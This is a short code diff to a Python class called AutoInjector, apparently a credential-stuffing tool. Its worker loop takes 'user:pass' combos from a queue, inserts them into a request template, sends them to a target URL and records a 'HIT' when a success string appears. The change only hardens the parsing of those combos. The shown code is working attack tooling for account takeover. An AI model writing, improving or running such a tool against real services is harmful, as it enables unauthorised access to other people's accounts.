@@ -36,19 +36,21 @@ class AutoInjector:
         while not self.work_queue.empty() and self.running:
             combo = self.work_queue.get()
             try:
-                user, password = combo.split(':')
-                payload = self.payload_template.replace('<USER>', user).replace('<PASS>', password)
-                
-                start_time = time.time()
-                if self.method == 'POST':
-                    resp = requests.post(self.target_url, data=payload, timeout=10)
-                else:
-                    resp = requests.get(self.target_url, params=payload, timeout=10)
-                
-                if self.success_key in resp.text:
-                    result = {"combo": combo, "status": "HIT", "time": f"{time.time() - start_time:.2f}s"}
-                    self.results.append(result)
-                    print(f"[HIT] {combo}")
+                # Assuming combo format user:pass
+                if ':' in combo:
+                    user, password = combo.split(':', 1)
+                    payload = self.payload_template.replace('<USER>', user).replace('<PASS>', password)
+                    
+                    start_time = time.time()
+                    if self.method == 'POST':
+                        resp = requests.post(self.target_url, data=payload, timeout=10)
+                    else:
+                        resp = requests.get(self.target_url, params=payload, timeout=10)
+                    
+                    if self.success_key in resp.text:
+                        result = {"combo": combo, "status": "HIT", "time": f"{time.time() - start_time:.2f}s"}
+                        self.results.append(result)
+                        print(f"[HIT] {combo}")
                 
             except Exception as e:
                 pass
